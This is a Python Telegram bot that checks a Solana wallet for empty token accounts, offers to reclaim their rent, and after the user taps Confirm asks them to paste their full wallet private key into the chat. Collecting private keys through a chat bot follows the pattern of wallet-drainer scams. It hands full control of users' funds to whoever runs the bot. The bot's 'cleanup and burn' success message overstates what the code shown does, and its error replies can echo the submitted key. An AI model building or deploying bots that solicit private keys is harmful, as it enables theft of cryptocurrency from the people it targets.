import os
import telebot
from solana_agentkit.core import SolanaAgent
from solana_agentkit.tools import transfer_tokens, get_balance
import base58

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

user_wallets = {}
user_states = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_states[message.chat.id] = None
    bot.reply_to(message, "Send me a Solana wallet address to check.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) is None)
def handle_wallet(message):
    address = message.text.strip()
    if len(address) < 32 or len(address) > 44:
        bot.reply_to(message, "❗ Invalid wallet address.")
        return

    # Here, we check the wallet for token accounts using solana-agentkit
    agent = SolanaAgent(rpc_url="https://api.mainnet-beta.solana.com")
    token_accounts = agent.get_token_accounts(address)

    total_rent = 0
    accounts_to_close = []
    display_tokens = []

    for token_account in token_accounts:
        token_info = token_account['info']
        amount = float(token_info['tokenAmount']['uiAmount'] or 0)
        decimals = token_info['tokenAmount']['decimals']
        mint = token_info['mint']
        owner = token_info['owner']

        if amount == 0:
            accounts_to_close.append(token_account['pubkey'])
            total_rent += 0.00203928

        display_tokens.append(f"{mint[:4]}...{mint[-4:]} = {amount}")

    if not display_tokens:
        bot.reply_to(message, "❗ No token accounts found.")
        return

    user_wallets[message.chat.id] = {
        "wallet": address,
        "accounts": accounts_to_close
    }

    response_msg = f"Wallet: `{address[:4]}...{address[-4:]}`\n"
    response_msg += f"Tokens found:\n" + "\n".join(display_tokens[:10]) + ("\n..." if len(display_tokens) > 10 else "")
    response_msg += f"\n\nEmpty accounts to close: `{len(accounts_to_close)}`\nExpected return: `{round(total_rent, 5)} SOL`"

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("✅ Confirm", callback_data="confirm"),
        telebot.types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
    )

    bot.send_message(message.chat.id, response_msg, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "confirm")
def handle_confirm(call):
    bot.send_message(call.message.chat.id, "Please send your private key:")
    user_states[call.message.chat.id] = "awaiting_private_key"

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "awaiting_private_key")
def handle_private_key(message):
    try:
        private_key = message.text.strip()
        decoded_key = base58.b58decode(private_key)

        # Verify private key length
        if len(decoded_key) != 64:
            bot.reply_to(message, "❌ Invalid private key length.")
            return

        agent = SolanaAgent(private_key=private_key, rpc_url="https://api.mainnet-beta.solana.com")
        pubkey = agent.get_public_key()

        if pubkey != user_wallets[message.chat.id]["wallet"]:
            bot.reply_to(message, "❌ Private key does not match wallet address.")
            return

        accounts = user_wallets[message.chat.id]["accounts"]
        bot.reply_to(message, f"✅ Verified.\nAccounts ready to close: {len(accounts)}")

        # Perform the cleanup (burn) operation
        for account in accounts:
            # Close empty accounts
            agent.close_account(account)
        bot.reply_to(message, "✅ Cleanup and burn operations completed successfully.")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Invalid private key: {e}")

bot.polling()
